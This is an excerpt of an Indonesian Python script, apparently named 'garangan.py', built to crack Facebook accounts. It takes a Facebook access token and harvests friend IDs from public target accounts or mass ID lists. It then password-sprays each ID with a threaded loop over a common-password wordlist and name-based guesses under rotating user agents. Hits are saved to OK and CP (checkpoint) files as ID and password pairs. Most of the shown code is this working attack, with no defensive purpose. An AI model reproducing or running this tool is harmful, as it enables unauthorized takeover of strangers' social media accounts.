...
def banner():
	...
	sol().print(wel2)
	au=' ✰│♼╱◥████████◣ ✰│╱◥██◣╱◥█████◣ ✰│ll║⚀║⚃║▓║⚂⚀⚅⚄║ ╠█╬━✭ python garangan.py ✭━╬█╬  '
	pengembang1=nel(au,style="green")
	cetak(nel(pengembang1, title=' Klo mau Rekode Monggo '))
...
def login():
		try:
			...
			try:
				...
				banner()
				li = ' WADOOH KONEKSI INTERNET ERROR'
...
def login_lagi():
	banner()
	sky = '# MOHON MAAFNYA SC nemu di wepsite digoogle, saya hapus link spam nya, biarin ngk lumpuh hp disaat cari avem, dan sc ini buat pribadi, KALO ERROR ketik : garangan.py  '
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(x+'['+p+'•'+x+'] Tancaaap Token Fb : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		sue = '# Masooooook Muaaazzz ndang Saaat Seeeeet ngono lho moaaasss '
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		menu()
	except KeyError:
		sue = '# Wadoooh Login Gagal, TOKEN MODAAR GAES...SaaaaT Seeeet ngono lho Mazzseeeeh!!!'
		suu = mark(sue, style='red')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		login_lagi()
	except requests.exceptions.ConnectionError:
		li = ' WADOOH INTERNET ERROR'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
...
def menu(my_name,my_id,my_birthday):
	...
	print(x+'['+h+'•'+x+'] \033[923mIp             : '+str(sh['origin']))
	io = '\x1b[1;92m[01] Dari Pertemanan publik si Target\n\x1b[1;92m[02] Masall ID Pertemanan Publik  ( CP parah ) \n\x1b[1;92m[03] Cek Hasil Crack\n\x1b[1;92m[04] Cek Opsi Checkpoint\n\033[31m[00] Keluar'
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='MENU HIDANGAN'))
	...
	if jh in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] Tunggu ...')
		time.sleep(1)
		sw = ' Sat set ngono lhoooo maZseh '
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				ric = '# TIDAK ADA DI MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				hehe = '# TIDAK DITEMUKAN, PERIKSA'
		...
		try:vin = os.listdir('OK')
			...
			gada = '# TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# BELUM MEMILIKI TARGET OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
...
def file():
	...
	if len(my_files)==0:
		yy = '# BELUM MEMILIKI RESULT UNTUK DICEK'
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin ')
	...
	try:
		...
		li = '# WADUH KONEKSI INTERNET ERROR'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN MODAR'
...
def dump_massal():
	...
	yz = 0
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Dari pertemanan')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			li = '# WADUUUH KONEKSI INTERNET ERROR'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	tot = '# TOTAL --> %s ID, JNGN LUPA MANDI'%(len(id))
	if len(id)==0:
...
def setting():
	...
	teks = '[01] Crack Dari Akun Old \n[02] Crack Dari Akun Baru \n[03] Sistem Acak sedapetnya '
	...
	aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi  Target (y/t) : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint target (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
# WORDLIST
def passwrd():
	ler = '# LOADING CARI TARGET --> TEKAN CTRL lalu Z UNTUK BERHENTI '
	sol().print(mark(ler, style='green'))
	krek = 'Live  : OK/%s\nLive : CP/%s\nMainkan Mode Pesawat, klo jaringan lemot susah dpt target, jaringan lemot dpt OK di login jd CP, klo dpt OK dilogin slh pzz coba login di crome '%(okc,cpc)
	cetak(nel(krek, title='CRACK'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangku','kekasihku','cintaku','bismillah','bintang','katasandi']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s ◣_◢ %s/%s ◣_◢ ok%s ◣_◢ cp%s ◣_◢ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s++++ %s|%s ◣_◢ CP       '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAA" in resp.text:
				print('\r%s++++ %s|%s ◣_◢ OK       '%(h,idf,pw))
...
def crack3(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s◓➽╦╤───── %s/%s ◣_◢ OK:%s ◣_◢ CP:%s ◣_◢ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
